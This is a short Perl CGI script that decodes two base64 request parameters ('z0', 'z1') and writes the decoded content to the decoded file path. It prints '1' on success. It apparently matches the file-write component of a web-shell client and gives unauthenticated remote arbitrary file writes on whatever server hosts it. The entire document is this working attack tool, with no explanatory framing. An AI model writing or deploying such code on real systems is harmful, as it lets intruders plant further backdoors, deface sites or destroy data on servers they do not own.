use strict;
use CGI;
use warnings;
use MIME::Base64;

my $q = CGI->new;
my $file_path = decode_base64($q->param('z0') // '');
my $content = decode_base64($q->param('z1') // '');

sub main {
    if (!$file_path) {
        print "ERROR://Missing file path";
        return;
    }

    open(my $fh, '>', $file_path) or do {
        print "ERROR://Unable to open file.";
        return;
    };

    print $fh $content or do {
        print "ERROR://Write failed";
        close($fh);
        return;
    };

    close($fh);
    print "1";

    return;
}

main();